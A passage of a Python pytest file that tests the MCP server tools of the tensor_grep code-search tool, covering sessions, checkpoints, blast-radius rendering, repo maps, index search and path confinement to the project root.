    checkpoint_id = created["checkpoint_id"]
    assert checkpoint_id.startswith("ckpt-")
    assert created["file_count"] == 1

    listing = json.loads(mcp_server.tg_checkpoint_list(str(project)))
    assert listing["version"] == 1
    assert listing["checkpoints"][0]["checkpoint_id"] == checkpoint_id

    target.write_text("value = 2\n", encoding="utf-8")
    restored = json.loads(mcp_server.tg_checkpoint_undo(checkpoint_id, str(project)))
    assert restored["checkpoint_id"] == checkpoint_id
    assert restored["restored_files"] == 1
    assert target.read_text(encoding="utf-8") == "value = 1\n"


def test_tg_session_mcp_tools_wrap_session_store(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    src_dir.mkdir(parents=True)
    (src_dir / "sample.py").write_text("def add(x):\n    return x\n", encoding="utf-8")

    opened = json.loads(mcp_server.tg_session_open(str(project)))
    session_id = opened["session_id"]
    assert opened["file_count"] == 1

    listing = json.loads(mcp_server.tg_session_list(str(project)))
    assert listing["version"] == 1
    assert listing["sessions"][0]["session_id"] == session_id

    shown = json.loads(mcp_server.tg_session_show(session_id, str(project)))
    assert shown["session_id"] == session_id
    assert shown["repo_map"]["files"] == [str((src_dir / "sample.py").resolve())]

    context = json.loads(mcp_server.tg_session_context(session_id, "add", str(project)))
    assert context["session_id"] == session_id
    assert context["routing_reason"] == "session-context"
    assert (
        context["coverage"]["language_scope"]
        == "c-cpp-csharp-go-java-javascript-php-python-rust-typescript"
    )
    assert (
        context["coverage"]["symbol_navigation"]
        == "parser-backed-refs-callers:go-javascript-python-rust-typescript+foundational-defs-imports-only:c-cpp-csharp-java-php"
    )
    assert context["coverage"]["test_matching"] == "filename+import+graph-heuristic"
    assert context["files"] == [str((src_dir / "sample.py").resolve())]


def test_tg_session_context_render_uses_cached_repo_map(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    src_dir.mkdir(parents=True)
    sample_path = src_dir / "sample.py"
    sample_path.write_text(
        "def add(x):\n    return x + 1\n",
        encoding="utf-8",
    )

    opened = json.loads(mcp_server.tg_session_open(str(project)))
    session_id = opened["session_id"]

    rendered = json.loads(mcp_server.tg_session_context_render(session_id, "add", str(project)))

    assert rendered["session_id"] == session_id
    assert rendered["routing_reason"] == "session-context-render"
    assert rendered["sources"][0]["name"] == "add"
    assert rendered["graph_trust_summary"]["edge_kind"] == "reverse-import"
    assert rendered["candidate_edit_targets"]["ranking_quality"] == rendered["ranking_quality"]
    assert rendered["candidate_edit_targets"]["coverage_summary"] == rendered["coverage_summary"]
    assert rendered["edit_plan_seed"]["validation_commands"] == []
    _assert_enriched_edit_plan_seed(
        rendered["edit_plan_seed"],
        primary_file=sample_path,
        primary_symbol_name="add",
    )
    assert 0.0 <= rendered["edit_plan_seed"]["confidence"]["symbol"] <= 1.0
    assert "rendered_context" in rendered


def test_tg_session_context_render_profile_includes_profiling_without_changing_output(
    tmp_path, monkeypatch
):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    src_dir.mkdir(parents=True)
    sample_path = src_dir / "sample.py"
    sample_path.write_text(
        "def add(x):\n    return x + 1\n",
        encoding="utf-8",
    )

    opened = json.loads(mcp_server.tg_session_open(str(project)))
    session_id = opened["session_id"]

    baseline = json.loads(mcp_server.tg_session_context_render(session_id, "add", str(project)))
    profiled = json.loads(
        mcp_server.tg_session_context_render(
            session_id,
            "add",
            str(project),
            profile=True,
        )
    )

    assert "_profiling" not in baseline
    assert profiled["_profiling"]["phases"]
    assert _without_profiling(profiled) == _without_profiling(baseline)


def test_tg_session_blast_radius_uses_cached_repo_map(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    tests_dir = project / "tests"
    src_dir.mkdir(parents=True)
    tests_dir.mkdir()

    module_path = src_dir / "payments.py"
    module_path.write_text("def create_invoice(total):\n    return total + 1\n", encoding="utf-8")
    service_path = src_dir / "service.py"
    service_path.write_text(
        "from src.payments import create_invoice\n\n"
        "def build_invoice(total):\n"
        "    return create_invoice(total)\n",
        encoding="utf-8",
    )
    test_path = tests_dir / "test_service.py"
    test_path.write_text(
        "from src.service import build_invoice\n\n"
        "def test_build_invoice():\n"
        "    assert build_invoice(2) == 3\n",
        encoding="utf-8",
    )

    opened = json.loads(mcp_server.tg_session_open(str(project)))
    session_id = opened["session_id"]

    payload = json.loads(
        mcp_server.tg_session_blast_radius(
            session_id,
            "create_invoice",
            str(project),
            max_depth=1,
        )
    )

    assert payload["session_id"] == session_id
    assert payload["routing_reason"] == "session-blast-radius"
    assert payload["max_depth"] == 1
    assert payload["definitions"][0]["file"] == str(module_path.resolve())
    assert any(caller["file"] == str(service_path.resolve()) for caller in payload["callers"])
    assert payload["tests"][0] == str(test_path.resolve())
    assert "Depth 0:" in payload["rendered_caller_tree"]


def test_tg_symbol_blast_radius_render_returns_prompt_ready_radius_bundle(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    tests_dir = project / "tests"
    src_dir.mkdir(parents=True)
    tests_dir.mkdir()

    module_path = src_dir / "payments.py"
    module_path.write_text("def create_invoice(total):\n    return total + 1\n", encoding="utf-8")
    service_path = src_dir / "service.py"
    service_path.write_text(
        "from src.payments import create_invoice\n\n"
        "def build_invoice(total):\n"
        "    return create_invoice(total)\n",
        encoding="utf-8",
    )
    test_path = tests_dir / "test_service.py"
    test_path.write_text(
        "from src.service import build_invoice\n\n"
        "def test_build_invoice():\n"
        "    assert build_invoice(2) == 3\n",
        encoding="utf-8",
    )

    payload = json.loads(
        mcp_server.tg_symbol_blast_radius_render(
            "create_invoice",
            str(project),
            max_depth=1,
            max_render_chars=400,
        )
    )

    assert payload["routing_reason"] == "symbol-blast-radius-render"
    assert payload["symbol"] == "create_invoice"
    assert payload["graph_trust_summary"]["edge_kind"] == "reverse-import"
    assert payload["sources"][0]["name"] == "create_invoice"
    assert payload["edit_plan_seed"]["primary_test"] == str(test_path.resolve())
    _assert_enriched_edit_plan_seed(
        payload["edit_plan_seed"],
        primary_file=module_path,
        primary_symbol_name="create_invoice",
    )
    assert "create_invoice" in payload["rendered_context"]


def test_tg_symbol_blast_radius_render_profile_includes_profiling_without_changing_output(
    tmp_path,
    monkeypatch,
):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    tests_dir = project / "tests"
    src_dir.mkdir(parents=True)
    tests_dir.mkdir()

    (src_dir / "payments.py").write_text(
        "def create_invoice(total):\n    return total + 1\n",
        encoding="utf-8",
    )
    (src_dir / "service.py").write_text(
        "from src.payments import create_invoice\n\n"
        "def build_invoice(total):\n"
        "    return create_invoice(total)\n",
        encoding="utf-8",
    )
    (tests_dir / "test_service.py").write_text(
        "from src.service import build_invoice\n\n"
        "def test_build_invoice():\n"
        "    assert build_invoice(2) == 3\n",
        encoding="utf-8",
    )

    baseline = json.loads(
        mcp_server.tg_symbol_blast_radius_render(
            "create_invoice",
            str(project),
            max_depth=1,
            max_render_chars=400,
        )
    )
    profiled = json.loads(
        mcp_server.tg_symbol_blast_radius_render(
            "create_invoice",
            str(project),
            max_depth=1,
            max_render_chars=400,
            profile=True,
        )
    )

    assert "_profiling" not in baseline
    assert profiled["_profiling"]["phases"]
    assert _without_profiling(profiled) == baseline


def test_tg_symbol_blast_radius_plan_returns_machine_readable_bundle(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    tests_dir = project / "tests"
    src_dir.mkdir(parents=True)
    tests_dir.mkdir()

    module_path = src_dir / "payments.py"
    module_path.write_text("def create_invoice(total):\n    return total + 1\n", encoding="utf-8")
    service_path = src_dir / "service.py"
    service_path.write_text(
        "from src.payments import create_invoice\n\n"
        "def build_invoice(total):\n"
        "    return create_invoice(total)\n",
        encoding="utf-8",
    )
    test_path = tests_dir / "test_service.py"
    test_path.write_text(
        "from src.service import build_invoice\n\n"
        "def test_build_invoice():\n"
        "    assert build_invoice(2) == 3\n",
        encoding="utf-8",
    )

    payload = json.loads(
        mcp_server.tg_symbol_blast_radius_plan("create_invoice", str(project), max_depth=1)
    )

    assert payload["routing_reason"] == "symbol-blast-radius-plan"
    assert "rendered_context" not in payload
    assert "sources" not in payload
    assert payload["graph_trust_summary"]["edge_kind"] == "reverse-import"
    assert payload["edit_plan_seed"]["primary_test"] == str(test_path.resolve())
    assert payload["candidate_edit_targets"]["spans"][0]["file"] == str(module_path.resolve())
    assert payload["candidate_edit_targets"]["spans"][0]["symbol"] == "create_invoice"
    _assert_enriched_edit_plan_seed(
        payload["edit_plan_seed"],
        primary_file=module_path,
        primary_symbol_name="create_invoice",
    )


def test_tg_session_blast_radius_render_uses_cached_repo_map(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    tests_dir = project / "tests"
    src_dir.mkdir(parents=True)
    tests_dir.mkdir()

    module_path = src_dir / "payments.py"
    module_path.write_text("def create_invoice(total):\n    return total + 1\n", encoding="utf-8")
    service_path = src_dir / "service.py"
    service_path.write_text(
        "from src.payments import create_invoice\n\n"
        "def build_invoice(total):\n"
        "    return create_invoice(total)\n",
        encoding="utf-8",
    )
    test_path = tests_dir / "test_service.py"
    test_path.write_text(
        "from src.service import build_invoice\n\n"
        "def test_build_invoice():\n"
        "    assert build_invoice(2) == 3\n",
        encoding="utf-8",
    )

    opened = json.loads(mcp_server.tg_session_open(str(project)))
    session_id = opened["session_id"]

    payload = json.loads(
        mcp_server.tg_session_blast_radius_render(
            session_id,
            "create_invoice",
            str(project),
            max_depth=1,
            max_render_chars=400,
        )
    )

    assert payload["session_id"] == session_id
    assert payload["routing_reason"] == "session-blast-radius-render"
    assert payload["symbol"] == "create_invoice"
    assert payload["sources"][0]["name"] == "create_invoice"
    assert payload["edit_plan_seed"]["primary_test"] == str(test_path.resolve())
    _assert_enriched_edit_plan_seed(
        payload["edit_plan_seed"],
        primary_file=module_path,
        primary_symbol_name="create_invoice",
    )
    assert "create_invoice" in payload["rendered_context"]


def test_session_serve_render_commands_include_enriched_edit_plan_seed(tmp_path):
    from tensor_grep.cli import session_store

    project = tmp_path / "project"
    src_dir = project / "src"
    tests_dir = project / "tests"
    src_dir.mkdir(parents=True)
    tests_dir.mkdir()

    module_path = src_dir / "payments.py"
    module_path.write_text("def create_invoice(total):\n    return total + 1\n", encoding="utf-8")
    service_path = src_dir / "service.py"
    service_path.write_text(
        "from src.payments import create_invoice\n\n"
        "def build_invoice(total):\n"
        "    return create_invoice(total)\n",
        encoding="utf-8",
    )
    (tests_dir / "test_service.py").write_text(
        "from src.service import build_invoice\n\n"
        "def test_build_invoice():\n"
        "    assert build_invoice(2) == 3\n",
        encoding="utf-8",
    )

    session_id = session_store.open_session(str(project)).session_id
    stdin = StringIO(
        "\n".join([
            json.dumps({"command": "context_render", "query": "create invoice"}),
            json.dumps({
                "command": "blast_radius_render",
                "symbol": "create_invoice",
                "max_depth": 1,
            }),
        ])
        + "\n"
    )
    stdout = StringIO()

    served = session_store.serve_session_stream(
        session_id,
        str(project),
        input_stream=stdin,
        output_stream=stdout,
    )

    assert served == 2
    responses = [json.loads(line) for line in stdout.getvalue().splitlines() if line.strip()]
    assert responses[0]["routing_reason"] == "session-context-render"
    _assert_enriched_edit_plan_seed(responses[0]["edit_plan_seed"])
    assert responses[1]["routing_reason"] == "session-blast-radius-render"
    _assert_enriched_edit_plan_seed(
        responses[1]["edit_plan_seed"],
        primary_file=module_path,
        primary_symbol_name="create_invoice",
    )
    assert str(service_path.resolve()) in responses[1]["edit_plan_seed"]["dependent_files"]


def test_tg_session_refresh_updates_cached_session_payload(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    src_dir.mkdir(parents=True)
    sample_path = src_dir / "sample.py"
    sample_path.write_text("def add(x):\n    return x\n", encoding="utf-8")

    opened = json.loads(mcp_server.tg_session_open(str(project)))
    session_id = opened["session_id"]

    second_path = src_dir / "billing.py"
    second_path.write_text("def issue_invoice():\n    return 2\n", encoding="utf-8")

    refreshed = json.loads(mcp_server.tg_session_refresh(session_id, str(project)))
    assert refreshed["session_id"] == session_id
    assert refreshed["file_count"] == 2
    assert isinstance(refreshed["refreshed_at"], str)
    assert refreshed["refreshed_at"]

    shown = json.loads(mcp_server.tg_session_show(session_id, str(project)))
    assert str(second_path.resolve()) in shown["repo_map"]["files"]


def test_tg_session_context_reports_stale_session_until_refreshed(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    src_dir.mkdir(parents=True)
    sample_path = src_dir / "sample.py"
    sample_path.write_text("def add(x):\n    return x\n", encoding="utf-8")

    opened = json.loads(mcp_server.tg_session_open(str(project)))
    session_id = opened["session_id"]

    sample_path.write_text("def add(x):\n    return x + 1\n", encoding="utf-8")

    stale = json.loads(mcp_server.tg_session_context(session_id, "add", str(project)))
    assert stale["error"]["code"] == "invalid_input"
    assert "changed on disk" in stale["error"]["message"]

    refreshed = json.loads(mcp_server.tg_session_refresh(session_id, str(project)))
    assert refreshed["session_id"] == session_id

    context = json.loads(mcp_server.tg_session_context(session_id, "add", str(project)))
    assert context["session_id"] == session_id
    assert context["routing_reason"] == "session-context"


def test_tg_session_context_can_auto_refresh_stale_session(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    src_dir.mkdir(parents=True)
    sample_path = src_dir / "sample.py"
    sample_path.write_text("def add(x):\n    return x\n", encoding="utf-8")

    opened = json.loads(mcp_server.tg_session_open(str(project)))
    session_id = opened["session_id"]

    sample_path.write_text(
        "def add(x):\n    return x\n\ndef settle_invoice():\n    return add(1)\n",
        encoding="utf-8",
    )

    context = json.loads(
        mcp_server.tg_session_context(
            session_id,
            "settle invoice",
            str(project),
            refresh_on_stale=True,
        )
    )
    assert context["session_id"] == session_id
    assert context["routing_reason"] == "session-context"
    assert any(symbol["name"] == "settle_invoice" for symbol in context["symbols"])


def test_tg_rewrite_diff_wraps_unified_diff_with_routing_metadata():
    from tensor_grep.cli import mcp_server

    diff_preview = "--- a/file.py\n+++ b/file.py\n@@ -1,1 +1,1 @@\n-old\n+new\n"

    with (
        patch("tensor_grep.cli.mcp_server.resolve_native_tg_binary", return_value=Path("tg.exe")),
        patch(
            "tensor_grep.cli.mcp_server.subprocess.run",
            return_value=CompletedProcess(
                args=["tg.exe"],
                returncode=0,
                stdout=diff_preview,
                stderr="",
            ),
        ) as mock_run,
    ):
        out = mcp_server.tg_rewrite_diff(
            pattern="def $F($$$ARGS): return $EXPR",
            replacement="lambda $$$ARGS: $EXPR",
            lang="python",
            path="src",
        )

    parsed = json.loads(out)
    assert parsed["routing_backend"] == "AstBackend"
    assert parsed["routing_reason"] == "ast-native"
    assert parsed["sidecar_used"] is False
    assert parsed["diff"] == diff_preview
    # round-8 (audit #95): path="src" is now confined+resolved to an absolute cwd-relative
    # path before it reaches the native argv.
    assert mock_run.call_args.args[0] == [
        "tg.exe",
        "run",
        "--lang",
        "python",
        "--rewrite",
        "lambda $$$ARGS: $EXPR",
        "--diff",
        "--",
        "def $F($$$ARGS): return $EXPR",
        str((Path.cwd() / "src").resolve()),
    ]


def test_tg_rewrite_plan_returns_structured_error_for_missing_path():
    from tensor_grep.cli import mcp_server

    # round-8 (audit #95): an absolute out-of-cwd path is now refused by CONFINEMENT before
    # ever reaching the "Path not found" existence check this test exercises -- use a
    # relative, in-root-but-nonexistent path so the existence check is still what fires.
    out = mcp_server.tg_rewrite_plan(
        pattern="def $F($$$ARGS): return $EXPR",
        replacement="lambda $$$ARGS: $EXPR",
        lang="python",
        path="definitely-missing-for-mcp-server-tests",
    )

    parsed = json.loads(out)
    assert parsed["routing_backend"] == "AstBackend"
    assert parsed["routing_reason"] == "ast-native"
    assert parsed["error"]["code"] == "invalid_input"
    assert "Path not found" in parsed["error"]["message"]
    assert "Traceback" not in parsed["error"]["message"]


def test_tg_index_search_returns_native_index_search_json_shape():
    from tensor_grep.cli import mcp_server

    payload = {
        "version": 1,
        "schema_version": 1,
        "routing_backend": "TrigramIndex",
        "routing_reason": "index-accelerated",
        "sidecar_used": False,
        "query": "ERROR",
        "path": "src",
        "total_matches": 1,
        "matches": [
            {
                "file": "C:/tmp/sample.log",
                "line": 2,
                "text": "ERROR database failed",
            }
        ],
    }

    with (
        patch("tensor_grep.cli.mcp_server.resolve_native_tg_binary", return_value=Path("tg.exe")),
        patch(
            "tensor_grep.cli.mcp_server.subprocess.run",
            return_value=CompletedProcess(
                args=["tg.exe"],
                returncode=0,
                stdout=json.dumps(payload),
                stderr="",
            ),
        ) as mock_run,
    ):
        out = mcp_server.tg_index_search(pattern="ERROR", path="src")

    parsed = json.loads(out)
    # audit A4: tolerate the added mcp_contract_version envelope key.
    assert {key: parsed[key] for key in payload} == payload
    assert parsed["mcp_contract_version"] == mcp_server._TG_MCP_SERVER_CONTRACT_VERSION
    # round-8 (audit #95): path="src" is now confined+resolved to an absolute cwd-relative
    # path before it reaches the native argv.
    assert mock_run.call_args.args[0] == [
        "tg.exe",
        "search",
        "--index",
        "--json",
        "--",
        "ERROR",
        str((Path.cwd() / "src").resolve()),
    ]


def test_tg_index_search_returns_structured_error_for_missing_path():
    from tensor_grep.cli import mcp_server

    # round-8 (audit #95): an absolute out-of-cwd path is now refused by CONFINEMENT before
    # ever reaching the "Path not found" existence check this test exercises -- use a
    # relative, in-root-but-nonexistent path so the existence check is still what fires.
    out = mcp_server.tg_index_search(
        pattern="ERROR",
        path="definitely-missing-for-mcp-server-tests",
    )

    parsed = json.loads(out)
    assert parsed["routing_backend"] == "TrigramIndex"
    assert parsed["routing_reason"] == "index-accelerated"
    assert parsed["error"]["code"] == "invalid_input"
    assert "Path not found" in parsed["error"]["message"]
    assert "Traceback" not in parsed["error"]["message"]


def test_tg_repo_map_returns_json_inventory(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    tests_dir = project / "tests"
    src_dir.mkdir(parents=True)
    tests_dir.mkdir()

    module_path = src_dir / "sample.py"
    module_path.write_text(
        "import pathlib\n\nclass Widget:\n    pass\n\ndef add(x, y):\n    return x + y\n",
        encoding="utf-8",
    )
    test_path = tests_dir / "test_sample.py"
    test_path.write_text("from src.sample import add\n", encoding="utf-8")

    payload = json.loads(mcp_server.tg_repo_map(str(project)))

    assert payload["version"] == 1
    assert payload["routing_backend"] == "RepoMap"
    assert payload["routing_reason"] == "repo-map"
    assert payload["sidecar_used"] is False
    assert (
        payload["coverage"]["language_scope"]
        == "c-cpp-csharp-go-java-javascript-php-python-rust-typescript"
    )
    assert payload["path"] == str(project.resolve())
    assert payload["scan_limit"]["max_repo_files"] == mcp_server._DEFAULT_MCP_REPO_SCAN_LIMIT
    assert payload["scan_limit"]["possibly_truncated"] is False
    assert str(module_path.resolve()) in payload["files"]
    assert str(test_path.resolve()) in payload["tests"]
    assert any(
        symbol["name"] == "Widget"
        and symbol["kind"] == "class"
        and symbol["file"] == str(module_path.resolve())
        for symbol in payload["symbols"]
    )
    assert any(
        symbol["name"] == "add"
        and symbol["kind"] == "function"
        and symbol["file"] == str(module_path.resolve())
        for symbol in payload["symbols"]
    )
    assert any(
        entry["file"] == str(module_path.resolve()) and "pathlib" in entry["imports"]
        for entry in payload["imports"]
    )
    assert str(module_path.resolve()) in payload["related_paths"]


def test_tg_repo_map_defaults_to_shared_mcp_repo_scan_limit(tmp_path, monkeypatch):
    """audit #114: tg_repo_map's signature hardcoded `max_repo_files: int | None = 512`
    while every sibling MCP scan tool (tg_symbol_defs, tg_edit_plan, tg_context_pack, etc.)
    defaults to the shared `_DEFAULT_MCP_REPO_SCAN_LIMIT` (2000). The effective-limit calc
    `max_repo_files or DEFAULT_AGENT_REPO_MAP_LIMIT` only reaches 2000 when a caller
    EXPLICITLY passes `None` -- the 512 signature default was truthy, so omitting the param
    (the normal agent-call case) silently capped the scan at 512 instead of 2000. Pin the
    argument actually forwarded to build_repo_map so this cannot regress to a hardcoded
    literal that drifts from the shared constant."""
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    project.mkdir()
    (project / "sample.py").write_text("def add(x, y):\n    return x + y\n", encoding="utf-8")

    seen: dict[str, object] = {}
    real_build_repo_map = mcp_server.build_repo_map

    def _spy_build_repo_map(path, max_repo_files=None, **kwargs):
        seen["max_repo_files"] = max_repo_files
        return real_build_repo_map(path, max_repo_files=max_repo_files, **kwargs)

    monkeypatch.setattr(mcp_server, "build_repo_map", _spy_build_repo_map)

    payload = json.loads(mcp_server.tg_repo_map(str(project)))

    assert seen["max_repo_files"] == mcp_server._DEFAULT_MCP_REPO_SCAN_LIMIT
    assert payload["scan_limit"]["max_repo_files"] == mcp_server._DEFAULT_MCP_REPO_SCAN_LIMIT


def test_tg_repo_map_includes_typescript_and_rust_inventory(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    src_dir.mkdir(parents=True)

    ts_path = src_dir / "payments.ts"
    ts_path.write_text(
        'import { money } from "./money";\n'
        "export class PaymentService {}\n"
        "export function createInvoice(total: number) {\n"
        "  return money(total);\n"
        "}\n",
        encoding="utf-8",
    )
    rust_path = src_dir / "billing.rs"
    rust_path.write_text(
        "use crate::payments::create_invoice;\n\n"
        "pub struct Invoice {}\n\n"
        "pub fn issue_invoice() -> Invoice {\n"
        "    let _ = create_invoice();\n"
        "    Invoice {}\n"
        "}\n",
        encoding="utf-8",
    )

    payload = json.loads(mcp_server.tg_repo_map(str(project)))

    assert (
        payload["coverage"]["language_scope"]
        == "c-cpp-csharp-go-java-javascript-php-python-rust-typescript"
    )
    assert any(
        symbol["name"] == "PaymentService"
        and symbol["kind"] == "class"
        and symbol["file"] == str(ts_path.resolve())
        for symbol in payload["symbols"]
    )
    assert any(
        symbol["name"] == "createInvoice"
        and symbol["kind"] == "function"
        and symbol["file"] == str(ts_path.resolve())
        for symbol in payload["symbols"]
    )
    assert any(
        symbol["name"] == "Invoice"
        and symbol["kind"] == "struct"
        and symbol["file"] == str(rust_path.resolve())
        for symbol in payload["symbols"]
    )
    assert any(
        symbol["name"] == "issue_invoice"
        and symbol["kind"] == "function"
        and symbol["file"] == str(rust_path.resolve())
        for symbol in payload["symbols"]
    )
    assert any(
        entry["file"] == str(ts_path.resolve()) and "./money" in entry["imports"]
        for entry in payload["imports"]
    )
    assert any(
        entry["file"] == str(rust_path.resolve())
        and "crate::payments::create_invoice" in entry["imports"]
        for entry in payload["imports"]
    )


def test_tg_orient_returns_json_capsule(tmp_path, monkeypatch):
    """audit #95 Part 2: tg_orient mirrors `tg orient --json` -> build_orient_capsule_json."""
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    (tmp_path / "hub.py").write_text("def hub():\n    pass\n", encoding="utf-8")
    (tmp_path / "leaf.py").write_text("import hub\n\n\ndef leaf():\n    pass\n", encoding="utf-8")

    payload = json.loads(mcp_server.tg_orient(str(tmp_path)))

    assert payload["routing_reason"] == "orient"
    assert payload["path"] == str(tmp_path.resolve())
    assert "central_files" in payload
    assert any(
        cf["file"] == str((tmp_path / "hub.py").resolve()) for cf in payload["central_files"]
    )
    assert "entry_points" in payload
    assert "snippets" in payload
    assert payload["mcp_contract_version"] == mcp_server._TG_MCP_SERVER_CONTRACT_VERSION
    assert isinstance(payload["schema_version"], int)


def test_tg_orient_docstring_directs_agent_to_call_first(tmp_path):
    """Design instruction: the docstring must close the 'run orient first is unreachable via
    MCP' gap by explicitly telling an agent to call this FIRST for orientation."""
    from tensor_grep.cli import mcp_server

    assert "call first for orientation" in (mcp_server.tg_orient.__doc__ or "").lower()


def test_tg_orient_forwards_max_tokens_max_central_files_and_ignore(monkeypatch):
    from tensor_grep.cli import mcp_server

    captured: dict[str, object] = {}

    def fake_build_orient_capsule_json(path, **kwargs):
        captured["path"] = path
        captured.update(kwargs)
        return json.dumps({"path": path, "routing_reason": "orient"})

    monkeypatch.setattr(mcp_server, "build_orient_capsule_json", fake_build_orient_capsule_json)

    mcp_server.tg_orient(
        ".",
        max_tokens=5000,
        max_central_files=25,
        ignore=["vendor/**", "core/skills/**"],
    )

    assert captured["max_tokens"] == 5000
    assert captured["max_central_files"] == 25
    assert captured["ignore"] == ("vendor/**", "core/skills/**")


def test_tg_orient_reports_structured_error_for_missing_path():
    from tensor_grep.cli import mcp_server

    # round-8 (audit #95): a relative, in-root-but-nonexistent path so the confinement check
    # (which fires first) is not what's being exercised here -- see the analogous
    # tg_index_search missing-path test above.
    out = mcp_server.tg_orient("definitely-missing-for-mcp-server-tests")

    parsed = json.loads(out)
    assert parsed["routing_backend"] == "RepoMap"
    assert parsed["routing_reason"] == "orient"
    assert parsed["error"]["code"] == "invalid_input"
    assert "Traceback" not in parsed["error"]["message"]


def test_tg_orient_confines_path_to_mcp_root(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    outside = tmp_path.parent / f"outside-{tmp_path.name}"
    outside.mkdir(exist_ok=True)
    try:
        out = mcp_server.tg_orient(str(outside))
        parsed = json.loads(out)
        assert parsed["error"]["code"] == "invalid_input"
        assert "must stay within" in parsed["error"]["message"]
    finally:
        outside.rmdir()


def test_tg_doctor_returns_json_payload(tmp_path, monkeypatch):
    """audit #95 Part 2: tg_doctor wraps _build_doctor_payload (main.py:2790)."""
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    payload = json.loads(mcp_server.tg_doctor(str(tmp_path), with_lsp=False))

    assert payload["root"] == str(tmp_path.resolve())
    assert payload["config"] == str((tmp_path / "sgconfig.yml").resolve())
    assert payload["lsp"]["enabled"] is False
    assert "native_tg_binary_exists" in payload
    assert "search_acceleration_backend" in payload
    assert payload["mcp_contract_version"] == mcp_server._TG_MCP_SERVER_CONTRACT_VERSION
    # _build_doctor_payload's OWN "version"/"schema_version" (the tensor-grep semver / doctor
    # schema int) must survive untouched -- _inject_mcp_contract_fields uses setdefault so it
    # must never clobber a key the underlying payload already set.
    assert payload["version"] == mcp_server._mcp_server_version()
    assert payload["schema_version"] == payload["doctor_schema_version"]


def test_tg_doctor_confines_path_to_mcp_root(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    outside = tmp_path.parent / f"outside-{tmp_path.name}"
    outside.mkdir(exist_ok=True)
    try:
        out = mcp_server.tg_doctor(str(outside), with_lsp=False)
        parsed = json.loads(out)
        assert parsed["error"]["code"] == "invalid_input"
        assert "must stay within" in parsed["error"]["message"]
    finally:
        outside.rmdir()


def test_tg_doctor_confines_config_param(tmp_path, monkeypatch):
    """New hardening beyond the literal ask: `config` is a SECONDARY param that
    `_build_doctor_payload` uses to relocate its `root` (config's parent dir) for every
    downstream diagnostic probe -- unconfined, it is the exact 'secondary anchor derived from
    an unconfined param' bug class #95's gate flagged (see tg_session_file_importers). Confine
    it to the (already-confined) doctor root, mirroring tg_ruleset_scan's baseline_path."""
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    outside_config = tmp_path.parent / f"outside-cfg-{tmp_path.name}" / "sgconfig.yml"
    outside_config.parent.mkdir(exist_ok=True)
    outside_config.write_text("", encoding="utf-8")
    try:
        out = mcp_server.tg_doctor(str(tmp_path), config=str(outside_config), with_lsp=False)
        parsed = json.loads(out)
        assert parsed["error"]["code"] == "invalid_input"
        assert "must stay within" in parsed["error"]["message"]
    finally:
        outside_config.unlink()
        outside_config.parent.rmdir()


def test_tg_doctor_empty_string_config_falls_back_like_cli(tmp_path, monkeypatch):
    """Edge case for the config-confinement addition above: CLI `doctor` treats an empty
    `--config ""` as "not provided" (falls back to root/sgconfig.yml) via a plain `if config:`
    truthiness check -- config confinement must preserve that, not treat "" as a real
    (trivially in-root) value that would overwrite the default resolution."""
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    payload = json.loads(mcp_server.tg_doctor(str(tmp_path), config="", with_lsp=False))

    assert payload["root"] == str(tmp_path.resolve())
    assert payload["config"] == str((tmp_path / "sgconfig.yml").resolve())


def test_tg_doctor_forwards_with_lsp_true_by_default(monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    captured: dict[str, object] = {}

    def fake_build_doctor_payload(path, config=None, *, with_lsp):
        captured["path"] = path
        captured["config"] = config
        captured["with_lsp"] = with_lsp
        return {"root": path}

    monkeypatch.setattr(mcp_server, "_build_doctor_payload", fake_build_doctor_payload)

    mcp_server.tg_doctor(".")

    assert captured["with_lsp"] is True


def test_tg_context_pack_returns_ranked_inventory(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    tests_dir = project / "tests"
    src_dir.mkdir(parents=True)
    tests_dir.mkdir()

    module_path = src_dir / "payments.py"
    module_path.write_text(
        "import decimal\n\n"
        "class PaymentService:\n"
        "    pass\n\n"
